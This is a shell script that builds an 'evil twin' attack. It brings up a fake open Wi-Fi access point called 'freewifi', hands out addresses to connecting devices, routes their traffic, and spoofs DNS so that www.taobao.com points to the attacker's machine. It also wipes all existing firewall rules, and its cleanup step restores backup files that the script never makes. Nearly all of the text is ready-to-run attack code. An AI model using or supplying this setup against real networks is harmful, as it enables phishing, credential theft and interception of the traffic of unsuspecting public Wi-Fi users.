# Set wlan0 to unmanaged
cat >/etc/NetworkManager/NetworkManager.conf <<'EOF'
[main]
plugins=keyfile
[keyfile]
unmanaged-devices=interface-name:wlan0
EOF
service network-manager restart

# Configure IP addr
ifconfig wlan0 up
ifconfig wlan0 up 10.0.0.1 netmask 255.255.255.0

# Enable forwarding
iptables --flush
iptables --table nat --flush
iptables --delete-chain
iptables --table nat --delete-chain
iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
iptables --append FORWARD --in-interface wlan0 -j ACCEPT
sysctl -w net.ipv4.ip_forward=1

# Configure DHCP server and DNS spoofing
cat >/etc/dnsmasq.conf <<'EOF'
no-resolv
interface=wlan0
dhcp-range=10.0.0.3,10.0.0.20,12h
server=8.8.8.8
server=10.0.0.1
address=/www.taobao.com/10.0.0.1
EOF
/etc/init.d/dnsmasq stop
pkill dnsmasq
dnsmasq

# Create fake AP
cat >/etc/hostapd/hostapd.conf <<'EOF'
interface=wlan0
driver=nl80211
ssid=freewifi
hw_mode=g
channel=6
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
EOF
hostapd /etc/hostapd/hostapd.conf

# Clean up
mv /etc/NetworkManager/NetworkManager.conf.backup /etc/NetworkManager/NetworkManager.conf
service network-manager restart
/etc/init.d/dnsmasq stop >/dev/null 2>&1
pkill dnsmasq
mv /etc/dnsmasq.conf.backup /etc/dnsmasq.conf >/dev/null 2>&1
rm /etc/dnsmasq.hosts >/dev/null 2>&1
wondershaper clear wlan0 >/dev/null 2>&1
iptables --flush
iptables --flush -t nat
iptables --delete-chain
iptables --table nat --delete-chain
